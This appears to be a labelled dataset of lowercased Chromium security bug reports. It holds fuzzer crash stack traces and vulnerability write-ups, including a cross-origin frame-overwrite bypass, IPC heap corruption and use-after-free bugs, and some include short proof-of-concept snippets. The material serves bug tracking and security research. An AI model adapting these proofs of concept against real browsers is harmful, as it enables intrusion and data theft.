drawtiledimage c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\graphicscontext.cpp 993 chrome webcore renderboxmodelobject paintfilllayerextended c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderboxmodelobject.cpp 757 chrome webcore renderbox paintfilllayers c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderbox.cpp 1376 chrome webcore renderbox paintbackground c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderbox.cpp 1139 chrome webcore renderbox paintboxdecorations c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderbox.cpp 1115 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3146 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore inlinebox paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\inlinebox.cpp 235 chrome webcore inlineflowbox paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\inlineflowbox.cpp 1135 chrome webcore rootinlinebox paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\rootinlinebox.cpp 176 chrome webcore renderlineboxlist paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderlineboxlist.cpp 232 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3175 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderblock paintfloats c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3261 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3187 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderblock paintchild c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3105 chrome webcore renderblock paintchildren c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3071 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3175 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderlistitem paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderlistitem.cpp 393 chrome webcore renderblock paintchild c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3105 chrome webcore renderblock paintchildren c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3071 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3175 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderblock paintchild c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3105 chrome webcore renderblock paintchildren c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3071 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3175 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderblock paintchild c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3105 chrome webcore renderblock paintchildren c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3071 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3175 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderblock paintchild c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3105 chrome webcore renderblock paintchildren c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3071 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3175 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 free stack trace asan_rtl agent asan heapproxy free e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_heap.cc 232 asan_rtl asan_heapfree e b\build\slave\syzygy_official\build\src\syzygy\agent\asan\asan_rtl_impl.cc 128 chrome skia bgraconvolve2d c b\build\slave\win-asan\build\src\skia\ext\convolver.cc 508 chrome skia imageoperations resizebasic c b\build\slave\win-asan\build\src\skia\ext\image_operations.cc 523 chrome webcore nativeimageskia resizedbitmap c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\skia\nativeimageskia.cpp 97 chrome webcore extractscaledimagefragment c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\skia\imageskia.cpp 283 chrome webcore drawresampledbitmap c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\skia\imageskia.cpp 322 chrome webcore paintskbitmap c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\skia\imageskia.cpp 390 chrome webcore bitmapimage draw c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\skia\imageskia.cpp 657 chrome webcore bitmapimage draw c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\skia\imageskia.cpp 610 chrome webcore image drawtiled c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\image.cpp 136 chrome webcore graphicscontext drawtiledimage c b\build\slave\win-asan\build\src\third_party\webkit\source\core\platform\graphics\graphicscontext.cpp 993 chrome webcore renderboxmodelobject paintfilllayerextended c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderboxmodelobject.cpp 757 chrome webcore renderbox paintfilllayers c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderbox.cpp 1376 chrome webcore renderbox paintbackground c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderbox.cpp 1139 chrome webcore renderbox paintboxdecorations c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderbox.cpp 1115 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3146 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore inlinebox paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\inlinebox.cpp 235 chrome webcore inlineflowbox paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\inlineflowbox.cpp 1135 chrome webcore rootinlinebox paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\rootinlinebox.cpp 176 chrome webcore renderlineboxlist paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderlineboxlist.cpp 232 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3175 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderblock paintfloats c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3261 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3187 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderblock paintchild c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3105 chrome webcore renderblock paintchildren c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3071 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3175 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderlistitem paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderlistitem.cpp 393 chrome webcore renderblock paintchild c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3105 chrome webcore renderblock paintchildren c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3071 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3175 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderblock paintchild c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3105 chrome webcore renderblock paintchildren c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3071 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3175 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderblock paintchild c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3105 chrome webcore renderblock paintchildren c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3071 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3175 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderblock paintchild c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3105 chrome webcore renderblock paintchildren c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3071 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066 chrome webcore renderblock paintobject c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3175 chrome webcore renderblock paint c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 2886 chrome webcore renderblock paintchild c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3105 chrome webcore renderblock paintchildren c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3071 chrome webcore renderblock paintcontents c b\build\slave\win-asan\build\src\third_party\webkit\source\core\rendering\renderblock.cpp 3066	11
heap-buffer-overflow in ska1_blitter blith detailed report fuzzer inferno_canvas_wrecker crash type heap-buffer-overflow write 1 crash address crash state crash stack ska1_blitter blith walk_edges sk_fill_path unminimized testcase	11
resourcehostmsg_requestresource validate request_data.priority enum looks like resourcehostmsg_requestresource handler does n't validate request_data.priority enum it can end up as an array index in prioritizeddispatcher handle prioritizeddispatcher add if num_running_jobs max_running_jobs priority	11
heap-use-after-free in webcore renderobject isdescendantof detailed report fuzzer inferno_twister crash type heap-use-after-free read 8 crash address crash state crash stack webcore renderobject isdescendantof webcore renderblock repaintoverhangingfloats free stack webcore node detach webcore element detach regressed minimized testcase 1.19 kb	11
heap-double-free in av_destruct_packet detailed report fuzzer inferno_flicker crash type heap-double-free crash address crash state crash stack av_destruct_packet av_free_packet free stack av_destruct_packet av_free_packet minimized testcase 285.15 kb	11
assertion failed node treescope m_oldscope heap-use-after-free in webcore node node detailed report fuzzer inferno_twister crash type heap-use-after-free read 8 crash address crash state crash stack webcore node node webcore text text free stack webcore node node webcore text text minimized testcase 2.31 kb	11
assertion failed actualinfo derefobjectfunction v8htmlspanelement info.derefobjectfunction unknown in webcore wrap detailed report fuzzer inferno_twister crash type unknown crash address crash state crash stack webcore wrap webcore createv8htmlwrapper webcore wrap regressed minimized testcase 7.79 kb	11
assertion failed value value isprimitivevalue unknown in webcore stylepropertyserializer getlayeredshorthandvalue detailed report fuzzer inferno_twister crash type unknown crash address crash state crash stack webcore stylepropertyserializer getlayeredshorthandvalue webcore stylepropertyserializer astext webcore stylepropertyset astext regressed minimized testcase 1.79 kb	11
angle check negative vector/matrix/array index angle has some infoleaks tparsecontext addconstvectornode if fields.offsets i node gettype getnominalsize tparsecontext addconstmatrixnode if index node gettype getnominalsize tparsecontext addconstarraynode if index node gettype getarraysize indexes can be negative exploited like this int leak ivec3 1 1 1 1 reproduction case poc is attached	11
assertion failed i m_length unknown in webcore inlinetextbox islinebreak detailed report fuzzer bj_broddelwerk crash type unknown crash address crash state crash stack webcore inlinetextbox islinebreak webcore inlinetextbox positionforoffset webcore rendertext localcaretrect regressed minimized testcase 8.89 kb	11
security possible for renderer process to read arbitrary files by tricking session restore vulnerability details i believe it may be possible for a renderer process to bypass the childprocesssecuritypolicy file access restrictions by tricking session restore the renderer process generates webhistoryitem objects that capture navigation state these go into the back/forward list a webhistoryitem contains file path information e.g the value of an input type file form control this is encoded in potentially two places in the webhistoryitem in the documentstate the html form data and the webcore formdata the http post data during session restore it looks like we crack open the webhistoryitem extract all of the file paths contained in it and then we just grant the renderer access to all of those file paths see the code here chromium/src/chrome/browser/sessions/session_restore.cc q=filepathsfromhistorystate sq=package chromium type=cs l=1025 it seems like when we first receive a webhistoryitem from the renderer we should similarly extract all of its file paths and validate at that time that the childprocesssecuritypolicy allows the renderer to read those paths based on a code search for filepathsfromhistorystate i do n't see us implementing that check version chrome version any operating system any reproduction case i have not tried creating an exploit based on this finding	11
heap-use-after-free in webcore htmltreebuilder calltheadoptionagency detailed report fuzzer inferno_layout_test_fuzzer crash type heap-use-after-free read 8 crash address crash state crash stack webcore htmltreebuilder calltheadoptionagency webcore htmltreebuilder processendtagforinbody free stack webcore htmlelementstack popcommon webcore htmlelementstack popuntilpopped minimized testcase 0.16 kb	11
assertion failed value value isprimitivevalue unknown in webcore stylepropertyserializer getlayeredshorthandvalue detailed report fuzzer kkania_chromebot crash type unknown crash address crash state crash stack webcore stylepropertyserializer getlayeredshorthandvalue webcore stylepropertyserializer getpropertyvalue webcore stylepropertyset getpropertyvalue regressed minimized testcase 0.08 kb download meta http-equiv refresh content 0 url additional requirements requires interaction gestures	11
assertion failed node node isshadowroot unknown in webcore eventretargeter eventtargetrespectingtargetrules detailed report fuzzer inferno_layout_test_fuzzer crash type unknown crash address crash state crash stack webcore eventretargeter eventtargetrespectingtargetrules webcore eventretargeter calculateeventpath webcore eventdispatcher dispatchevent minimized testcase 6.18 kb	11
assertion failed m_deletionhasbegun heap-use-after-free in webcore genericeventqueue enqueueevent detailed report fuzzer inferno_twister crash type heap-use-after-free read 4 crash address crash state crash stack webcore genericeventqueue enqueueevent webcore htmlmediaelement scheduleevent free stack webcore htmlmediaelement htmlmediaelement webcore htmlvideoelement htmlvideoelement regressed minimized testcase 1.53 kb	11
assertion failed value value isprimitivevalue unknown in webcore stylepropertyserializer getlayeredshorthandvalue detailed report fuzzer bj_doc_fuzzer crash type unknown crash address crash state crash stack webcore stylepropertyserializer getlayeredshorthandvalue webcore stylepropertyserializer getpropertyvalue webcore stylepropertyset getpropertyvalue regressed minimized testcase 0.60 kb	11
resourcehostmsg_datareceived_ack heap corruption browser process heap can be corrupted using the resourcehostmsg_datareceived_ack ipc message it is handled by asyncresourcehandler ondatareceivedack which does buffer recycleleastrecentlyallocated and resourcebuffer recycleleastrecentlyallocated does dcheck alloc_sizes_.empty int allocation_size alloc_sizes_.front alloc_sizes_.pop which assumes that alloc_sizes is not empty a compromised renderer can send the message while alloc_sizes is empty this can be exploited in two ways 1 attacker can control allocation_size so it can control the address of future allocations by resourcebuffer 2 alloc_sizes is std queue int which does n't do any sanity checks at least on linux after 128 calls to pop its internal 512-byte buffer to store ints is freed a following push will write to freed memory a poc for this case is attached reproduction case the poc works with the linux implementation of std queue 1 apply repro.patch and compile 2 run the server bash script 3 navigate to	11
attempting free when chrome.fontsettings.getfontlist is called twice in background script detailed report fuzzer meacer_extension_apis crash type attempting free crash address add crash state crash stack base base platformthread create base simplethread start additional requirements requires interaction gestures	11
security origin bypass by writing window.frames i vulnerability details the window 0 window n properties on a web page more commonly accessed as frames i usually contains the active frames on the page as such this pseudo-array contains only window objects a frame can be added or deleted from it but overwriting window i does not make sense and should normally be disallowed on chrome 27 and a couple of other versions i tested window i can be overwritten by an arbitrary object try window 0 a:1 on a page that has any iframe in it what turns this into a big security hole is that any value written into window i becomes accessible to any other frame on any origin this is a bug i suspect it is designed this way because the other frame is allowed to read window.frames i windows i and chrome does not check whether window.frames i has been modified after the frame was started specifically it does not check whether it was changed to a non-window object as you can imagine this punches a hole through the same-origin policy any frame on any origin can read/write variables call functions and send/receive objects on any other frame via window i this has serious security implications it is a new xss vector it enables data exfiltration it may allow authentication bypass on applications that rely on cross-frame communication and more generally it enables scripts on different origins to pass objects to each other without any checks in between two concrete exploits from the viewpoint of a hosting website the main risk is xss and data exfiltration if an attacker frame can convince the website to set a variable to this i or window i or top i then this variable becomes a gateway through which any frame can inject code into the website and steal data see for a demo from the viewpoint of hosted frames the risk is authentication bypass the single sign-on solutions of facebook and google plus both rely on cross-frame communication to pass authentication tokens a typical scenario is to have two frames from facebook/google hosted on a potentially malicious website the first frame finds the second frame and calls a function inside it to deliver the token the assumption is that the browser would forbid the function call if the target frame is on a different origin in our experience this sort of cross-frame can-i-access-document check is quite common for security components the vulnerability shown here can lead to bypassing this check e.g suppose the hosting website sets window.frames i document document location whatever then any frame looking for another frame from its origin can be fooled into thinking it is calling a function from its own origin but is in fact calling the parent a minor mitigation the bug above only appears to apply to window i where i is an integer if a window is accessed through an id e.g window id1 then modifying this property still allowed does not result in other frames being able to read it this gives some protection to honest frames trying to access other frames from their own origin if they use string identifiers for frames rather than iterating through the frames pseudo-array they will not accidentally access a non-window object or trigger any functions version chrome version 27.0.1453.116 operating system mac os windows reproduction case for a proof-of-concept demo see the relevant code simplified is parent frame iframe src child-origin iframe script window 0 a 1 f function alert child called parent.f script child frame script alert parent 0 a parent 0 f script the poc demo also shows how code can be injected into the parent i have also tested the dual case and yes the parent can access the child too if it writes to its own windows i more generally a frame can exploit this bug across any number of honest frames e.g top.frames i frames j frames 0 f would still work	5
heap-use-after-free in webcore mutationobserverregistration mutationobserverregistration vulnerability details the following testcase crashes the chrome asan build the testcase requires javascript gc to be enabled version chrome version asan-symbolized-linux-release-211418 operating system linux 64bit reproduction case html script function start o10=document.createelement input o62=document.documentelement o10.appendchild o62 f function o63=new mutationobserver f o63.observe o10 attributes true characterdata true subtree true characterdataoldvalue true o10.removechild o62 o10=null gc o63.disconnect script body onload start body html for crashes please include the following additional information type of crash tab crash state see attached asan log file	11
heap-use-after-free in webcore document dispose winfuzz has found a heap use-after-free in chrome 29.0.1530.0 204279 syzyasan build fuzzer ifratric-browserfuzzer stack trace of the crash 0:000 cxr 0026ecf0 kv eax=051bdb60 ebx=00000000 ecx=00002034 edx=00000050 esi=0520844c edi=0375a950 eip=5b18f935 esp=0026f018 ebp=0026f03c iopl=0 nv up ei pl zr na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246 chrome_57be0000 webcore document dispose 5b18f935 8bbea0030000 mov edi dword ptr esi+3a0h ds:002b:052087ec=38f51a05 stack trace for last set context thread/.cxr resets it childebp retaddr args to child 0026f020 5b1737bb 5a998772 5a6e225f 05208420 chrome_57be0000 webcore document dispose fpo 0,0,4 conv thiscall d src\chrome\src\third_party\webkit\source\core\dom\document.cpp 638 0026f028 5a6e225f 05208420 05208424 0375a950 chrome_57be0000 webcore node removedlastref fpo 0,0,4 conv thiscall d src\chrome\src\third_party\webkit\source\core\dom\node.cpp 2613 0026f03c 59a453a2 015c9400 05208420 05208424 chrome_57be0000 webcore scriptwrappable makeweakcallback fpo non-fpo conv cdecl d src\chrome\src\third_party\webkit\source\bindings\v8\scriptwrappable.h 195 0026f068 59a456b8 015c9400 00000001 015c9408 chrome_57be0000 v8 internal globalhandles node postgarbagecollectionprocessing fpo non-fpo conv thiscall d src\chrome\src\v8\src\global-handles.cc 268 0026f090 59a42110 00000001 0026f0e8 02682348 chrome_57be0000 v8 internal globalhandles postgarbagecollectionprocessing fpo non-fpo conv thiscall d src\chrome\src\v8\src\global-handles.cc 660 0026f0c0 59a42ad7 00000001 0026f0e8 015c9408 chrome_57be0000 v8 internal heap performgarbagecollection fpo non-fpo conv thiscall d src\chrome\src\v8\src\heap.cc 986 0026f1c4 59a43255 00000001 00000001 5bc120dc chrome_57be0000 v8 internal heap collectgarbage fpo non-fpo conv thiscall d src\chrome\src\v8\src\heap.cc 662 0026f1e4 59a43f0f 00000002 5bc120dc 040fd5a8 chrome_57be0000 v8 internal heap collectallgarbage fpo non-fpo conv thiscall d src\chrome\src\v8\src\heap.cc 571 0026f200 59a11b4d 000003e8 0026f240 5aa16888 chrome_57be0000 v8 internal heap idlenotification fpo non-fpo conv thiscall d src\chrome\src\v8\src\heap.cc 5810 0026f20c 5aa16888 000003e8 04def508 5af1af5f chrome_57be0000 v8 internal v8 idlenotification fpo non-fpo conv cdecl d src\chrome\src\v8\src\v8.cc 196 0026f218 5af1af5f 04def508 59fdb931 03700400 chrome_57be0000 webcore v8gcforcontextdispose pseudoidletimerfired fpo 1,0,4 conv thiscall d src\chrome\src\third_party\webkit\source\bindings\v8\v8gcforcontextdispose.cpp 74 0026f220 59fdb931 03700400 0026f3b4 89374bc7 chrome_57be0000 webcore timer webcore inspectorheapprofileragent heapstatsupdatetask fired fpo 0,0,0 conv thiscall d src\chrome\src\third_party\webkit\source\core\platform\timer.h 115 0026f240 595736cc 051e8f00 0026f3b4 0026f7f0 chrome_57be0000 webcore threadtimers sharedtimerfiredinternal fpo non-fpo conv thiscall d src\chrome\src\third_party\webkit\source\core\platform\threadtimers.cpp 132 0026f264 59572dc7 00000000 0026f39c 57bf8359 chrome_57be0000 base timer runscheduledtask fpo non-fpo conv thiscall d src\chrome\src\base\timer.cc 181 0026f270 57bf8359 051e8f40 00000014 0026f7f0 chrome_57be0000 base basetimertaskinternal run fpo non-fpo conv thiscall d src\chrome\src\base\timer.cc 47 0026f39c 57bf9b85 0026f3b4 015cf560 0026f7f0 chrome_57be0000 base messageloop runtask fpo non-fpo conv thiscall d src\chrome\src\base\message_loop.cc 486 0026f3fc 57c25a69 015cf570 00000008 0026f7f0 chrome_57be0000 base messageloop dodelayedwork fpo non-fpo conv thiscall d src\chrome\src\base\message_loop.cc 726 0026f4d4 57bfa3eb 0026f7f0 0026f5ac 5b755a4c chrome_57be0000 base messagepumpdefault run fpo non-fpo conv thiscall d src\chrome\src\base\message_pump_default.cc 33 0026f59c 57c17d40 0026fb1c 57bf6e86 0026f7f0 chrome_57be0000 base messageloop runinternal fpo non-fpo conv thiscall d src\chrome\src\base\message_loop.cc 441 0026f5a4 57bf6e86 0026f7f0 00000000 0026f5ac chrome_57be0000 base runloop run fpo 0,0,4 conv thiscall d src\chrome\src\base\run_loop.cc 46 0026f5c8 5949c9e0 01c894e0 01c87ba0 3f9b8000 chrome_57be0000 base messageloop run fpo non-fpo conv thiscall d src\chrome\src\base\message_loop.cc 322 0026f96c 5873373f 0026fb1c 015d0160 015d0288 chrome_57be0000 content renderermain fpo non-fpo conv cdecl d src\chrome\src\content\renderer\renderer_main.cc 236 0026fa48 5873394d 0026fb28 0026fb1c 0026fb8c chrome_57be0000 content runnamedprocesstypemain fpo non-fpo conv cdecl d src\chrome\src\content\app\content_main_runner.cc 433 0026fb64 5872fe00 01635300 01631690 0026fbac chrome_57be0000 content contentmainrunnerimpl run fpo non-fpo conv thiscall d src\chrome\src\content\app\content_main_runner.cc 756 0026fb74 57be1020 00f60000 0026fc40 0026fb8c chrome_57be0000 content contentmain fpo non-fpo conv cdecl d src\chrome\src\content\app\content_main.cc 35 0026fbac 00f6b359 00f60000 0026fc40 00000000 chrome_57be0000 chromemain fpo non-fpo conv cdecl d src\chrome\src\chrome\app\chrome_main.cc 28 allocation stack trace 0:000 dps 04510f08 l39 04510f08 0f199910 asan_rtl asan_check_1_byte_stos_access 04510f0c 0f194c18 asan_rtl asan_heapalloc 04510f10 585431d0 chrome_57be0000 malloc d src\chrome\src\base\allocator\allocator_shim.cc 130 04510f14 585432ba chrome_57be0000 generic_cpp_alloc d src\chrome\src\base\allocator\generic_allocators.cc 16 04510f18 58543377 chrome_57be0000 operator new d src\chrome\src\base\allocator\generic_allocators.cc 28 04510f1c 5b20e201 chrome_57be0000 webcore domimplementation createdocument d src\chrome\src\third_party\webkit\source\core\dom\domimplementation.cpp 393 04510f20 5acef9b0 chrome_57be0000 webcore documentwriter begin d src\chrome\src\third_party\webkit\source\core\loader\documentwriter.cpp 118 04510f24 5acbe401 chrome_57be0000 webcore documentloader commitdata d src\chrome\src\third_party\webkit\source\core\loader\documentloader.cpp 645 04510f28 59d338e4 chrome_57be0000 webkit frameloaderclientimpl committedload d src\chrome\src\third_party\webkit\source\webkit\chromium\src\frameloaderclientimpl.cpp 932 04510f2c 5acbe32f chrome_57be0000 webcore documentloader commitload d src\chrome\src\third_party\webkit\source\core\loader\documentloader.cpp 627 04510f30 5acbe63c chrome_57be0000 webcore documentloader datareceived d src\chrome\src\third_party\webkit\source\core\loader\documentloader.cpp 708 04510f34 5aed08d3 chrome_57be0000 webcore cachedrawresource appenddata d src\chrome\src\third_party\webkit\source\core\loader\cache\cachedrawresource.cpp 51 04510f38 5aec4efc chrome_57be0000 webcore resourceloader didreceivedata d src\chrome\src\third_party\webkit\source\core\loader\resourceloader.cpp 371 04510f3c 5b383011 chrome_57be0000 webcore resourcehandleinternal didreceivedata d src\chrome\src\third_party\webkit\source\core\platform\network\resourcehandle.cpp 139 04510f40 59242041 chrome_57be0000 webkit_glue weburlloaderimpl context onreceiveddata d src\chrome\src\webkit\glue\weburlloader_impl.cc 695 04510f44 592d5d38 chrome_57be0000 content resourcedispatcher onreceiveddata d src\chrome\src\content\common\resource_dispatcher.cc 421 04510f48 592d2ae9 chrome_57be0000 resourcemsg_datareceived dispatch content resourcedispatcher content resourcedispatcher int int int int d src\chrome\src\content\common\resource_messages.h 247 04510f4c 592d6b80 chrome_57be0000 content resourcedispatcher dispatchmessagew d src\chrome\src\content\common\resource_dispatcher.cc 616 04510f50 592d7129 chrome_57be0000 content resourcedispatcher onmessagereceived d src\chrome\src\content\common\resource_dispatcher.cc 307 04510f54 5928c792 chrome_57be0000 content childthread onmessagereceived d src\chrome\src\content\common\child_thread.cc 241 04510f58 5855886b chrome_57be0000 ipc channelproxy context ondispatchmessage d src\chrome\src\ipc\ipc_channel_proxy.cc 267 04510f5c 589641ea chrome_57be0000 base internal invoker 2 base internal bindstate base internal runnableadapter void thiscall content inputtagspeechdispatcherhost inputtagspeechhostmsg_startrecognition_params const void cdecl content inputtagspeechdispatcherhost inputtagspeechhostmsg_startrecognition_params const void cdecl content inputtagspeechdispatcherhost inputtagspeechhostmsg_startrecognition_params void cdecl content inputtagspeechdispatcherhost inputtagspeechhostmsg_startrecognition_params const run d src\chrome\src\base\bind_internal.h 1253 04510f60 57bf8359 chrome_57be0000 base messageloop runtask d src\chrome\src\base\message_loop.cc 486 04510f64 57bfb333 chrome_57be0000 base messageloop dowork d src\chrome\src\base\message_loop.cc 689 04510f68 57c25b84 chrome_57be0000 base messagepumpdefault run d src\chrome\src\base\message_pump_default.cc 30 04510f6c 57bfa3eb chrome_57be0000 base messageloop runinternal d src\chrome\src\base\message_loop.cc 441 04510f70 57c17d40 chrome_57be0000 base runloop run d src\chrome\src\base\run_loop.cc 46 04510f74 5949c9e0 chrome_57be0000 content renderermain d src\chrome\src\content\renderer\renderer_main.cc 236 04510f78 5873373f chrome_57be0000 content runnamedprocesstypemain d src\chrome\src\content\app\content_main_runner.cc 433 04510f7c 5873394d chrome_57be0000 content contentmainrunnerimpl run d src\chrome\src\content\app\content_main_runner.cc 756 04510f80 5872fe00 chrome_57be0000 content contentmain d src\chrome\src\content\app\content_main.cc 35 04510f84 57be1020 chrome_57be0000 chromemain d src\chrome\src\chrome\app\chrome_main.cc 28 free stack trace 0:000 dps 048cfe40 l34 048cfe40 0f199ac1 asan_rtl asan_check_1_byte_stos_access 048cfe44 0f194cc2 asan_rtl asan_heapfree 048cfe48 5854334e chrome_57be0000 operator delete d src\chrome\src\base\allocator\allocator_shim.cc 163 048cfe4c 5b315cd9 chrome_57be0000 webcore textdocument scalar deleting destructor 048cfe50 5b17e4a4 